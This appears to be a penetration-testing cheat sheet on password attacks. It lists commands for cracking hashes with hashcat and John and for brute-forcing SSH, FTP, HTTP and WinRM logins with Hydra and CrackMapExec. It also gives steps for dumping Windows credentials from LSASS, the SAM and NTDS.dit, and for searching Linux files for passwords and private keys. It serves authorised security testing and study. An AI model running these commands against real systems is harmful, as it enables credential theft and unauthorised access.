# Password Attacks

## **Default Credentials and Online Hash Cracking**

> Before attempting login bruteforcing or any password-based attacks, you should always check for **password re-use and default credentials usage**.\
> Also, after finding a hash, you should use one of the following **online cracking databases** before performing dictionary attacks or bruteforcing.

**Default Credentials:**

Always try googling the service's name followed by "default credentials".\
If that doesn't work, you can check the following resources:

1. [https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
2. [https://github.com/Dormidera/WordList-Compendium](https://github.com/Dormidera/WordList-Compendium)
3. [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)
4. [https://bizuns.com/default-passwords-list](https://bizuns.com/default-passwords-list)
5. [https://www.cirt.net/passwords](https://www.cirt.net/passwords)

**Online Databases - Hash Cracking:**

Whenever finding a hash, always try cracking it using one of the following online databases:

1. [https://crackstation.net/](https://crackstation.net/)
2. [https://www.cmd5.org/](https://www.cmd5.org/)
3. [https://md5decrypt.net/](https://md5decrypt.net/)
4. [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html)

***

## **Making Custom Wordlists**

The following commands can help making a custom user or password wordlist after gaining more information about the specific target

* Interactively create a custom Password Wordlist using cupp: `cupp -i`
* Generate usernames list starting from name and surname: `./username-anarchy Bill Gates > wordlist.txt`
* Remove passwords shorter than 8 characters from wordlist: `sed -ri '/^.{,7}$/d' wordlist.txt`
* Remove passwords without numbers from wordlist: `sed -ri '/[0-9]+/!d' wordlist.txt`

***

## **Making Wordlist Mutations**

> A wordlist mutation is simply the result obtained through the process of adding several characters to a pre-existing wordlist. Basic examples are the following:\
> \[-] Adding special characters at the end of each word\
> \[-] Adding numbers at the end of each word\
> \[-] Transforming every word in leet (l33t) format, e.g. "ciao" becomes "c140"

* Generate wordlist based on keywords on a website:\
  `cewl https://example.idk -d 4 -m 6 --lowercase -w wordlist.txt`
* Generate a rule-based wordlist: `hashcat --force password.list -r custom.rule --stdout > new.list`

***

## **Offline Password Cracking**

Offline password cracking refers to the process of locally recovering a cleartext password from a previously obtained password hash. This process doesn't involve any interaction with the target system you are trying to access

**Cracking hashes using Hashcat:**

* Hashcat basic usage: `hashcat -m MODE_NUMBER hashfile /path/to/wordlist`
* Crack NTLM hashes: `hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt`
* Crack NTLMv2 hashes: `hashcat -m 5600 ntlm /usr/share/wordlists/rockyou.txt`
* Crack TGS Ticket after Kerberoasting: `hashcat -m 13100 kerberoasted /usr/share/wordlists/rockyou.txt`
* Crack TGS Ticket after ASREProasting: `hashcat -m 18200 asreproasted /usr/share/wordlists/rockyou.txt`
* Crack unshadowed hashes: `hashcat -m 1800 -a 0 unshadowed /usr/share/wordlists/rockyou.txt -o outfile`
* Crack MD5 hashes: `hashcat -m 500 -a 0 md5-hashes.list /usr/share/wordlists/rockyou.txt`
* Crack BitLocker hashes: `hashcat -m 22100 backup.hash /usr/share/wordlists/rockyou.txt -o backup.cracked`
* Crack KeePass hashes: `hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt`

**Cracking hashes using John:**

* John basic usage: `john --wordlist=/usr/share/wordlists/rockyou.txt hashfile`
* Show cracking result: `john cracked-hash-file --show`
* John unshadowing: `unshadow /etc/passwd /etc/shadow > unshadowed.hashes`
* Crack hash specifying its format: `john --format=hash-type hash_to_crack.txt`

**Cracking files using John Scripts:**

* Install with `sudo apt install john-data`
* John data is a package containing scripts to transform different file types to hashes to crack
* Most of the scripts' usage is the same:\
  `example2john example > hash` followed by `john --wordlist=wordlist.txt hash`
* Some of the mostly used ones are the following:\
  `rar2john`, `zip2john`, `ssh2john`, `pdf2john`, `office2john`, `keepass2john`
* You can find the entire list of scripts and their usage here:\
  [https://www.kali.org/tools/john/#john-data](https://www.kali.org/tools/john/#john-data)

***

## **Bruteforcing Protocols and Services Authentication**

> If you have access to NTLM password hashes or Kerberos Tickets, you should always check if you can authenticate using PtH (Pass the Hash) or PtT (Pass the Ticket)\
> For more information on how to do that, refer to the Active Directory (Kerberos) Notes.

When facing an interesting exposed protocol or service, you could try bruteforcing its authentication in order to gain access.

* Hydra basic usage: `hydra -L user.list -P password.list service://ip`
* Hydra HTTP Basic Authentication bruteforcing:\
  `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /`
* Hydra HTTP Post Form Login bruteforcing (error text message):\
  `hydra -l username -P passwords.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:ErrorMessageonLoginFailure"`
* Hydra HTTP Post Form Login bruteforcing (error HTTP element):\
  `hydra -l username -P passwords.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`
* Hydra SSH Authentication bruteforcing:\
  `hydra -L usernames.txt -P passwords.txt -u -f ssh://SERVER_IP:PORT -t 4`
* Hydra FTP Authentication bruteforcing: `hydra -l username -P passwordslist.txt ftp://ServerIP`
* CrackMapExec to bruteforce WinRM: `crackmapexec winrm ip -u userlist -p passwordlist`

***

## **Hunting Passwords in Windows**

**Finding passwords in files:**

1. Find files containing the "password" string in different file types:\
   `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`

**Extract credentials by dumping LSASS:**

1. Enumerate the LSASS process PID: `Get-Process lsass` or `tasklist /svc`
2. Create a LSASS dump by specifying the process' PID:\
   `rundll32 C:\windows\system32\comsvcs.dll, MiniDump LSASS-PID C:\lsass.dmp full`
3. Extract Credentials: `pypykatz lsa minidump /path/to/lsassdumpfile`

**Extract credentials from the SAM Database:**

1. Save a copy of the SAM, SECURIRY and SYSTEM registry hives:
   * `reg.exe save hklm\sam C:\sam.save`
   * `reg.exe save hklm\security C:\sam.security`
   * `reg.exe save hklm\system C:\sam.system`
2. Dump password hashes from the SAM database:\
   `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`

**Extract hashes from the NTDS.dit file:**

1. Fast way: Use CME with valid credentials:\
   `crackmapexec smb targetIP -u validuser -p password --ntds`
2. Harder way: Create a volume shadow copy for the C Drive to copy the NTDS.dit file safely:\
   `vssadmin CREATE SHADOW /For=C:`
3. Create a copy of NTDS.dit for a volume shadow copy of C:\
   `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`

***

## **Hunting Passwords in Linux**

**Finding passwords in files:**

1. Find passwords in configuration files:\
   `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`
2. Find common database files:\
   `for l in $(echo ".sql .db .\*db .db\*");do echo -e "\nDB File extension: " $l; find / -name \*\$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done | Script that can be used to find common database files.`
3. Find script files: `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done`
4. Find common document files:\
   `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`
5. View the contents of crontab in search for credentials: `cat /etc/crontab`
6. Search files with potential SSH private keys:\
   `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`
